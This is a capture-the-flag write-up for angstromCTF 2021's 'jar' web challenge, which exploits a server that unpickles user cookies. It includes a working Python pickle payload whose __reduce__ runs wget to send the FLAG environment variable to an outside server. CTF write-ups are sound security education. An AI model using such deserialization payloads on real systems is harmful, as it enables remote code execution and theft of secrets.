# angstromCTF 2021

* **Category:**  Web
* **Points:** 70pts
* **Author:** [Movement](https://github.com/MovementGH)

## Challenge

>My other pickle challenges seem to be giving you all a hard time, so >here's a simpler one to get you warmed up.
>
>jar.py, pickle.jpg, Dockerfile

If we inspect the source of the website, we see it is unpickling a user's cookie. We can exploit the `__reduce__` method being executed by pickle to run code on the server.

We can see that the flag is stored in the `FLAG` environment variable, so if we execute a bash command we can make a request to our server and look at the logs to see what the url was.

```py
import pickle
import base64

class MMM(object):
    def __reduce__(self):
        import os
        s = "wget https://openbot.ga/$FLAG"
        return (os.popen, (s,))
    

payload = pickle.dumps(MMM())
print(base64.b64encode(payload))
```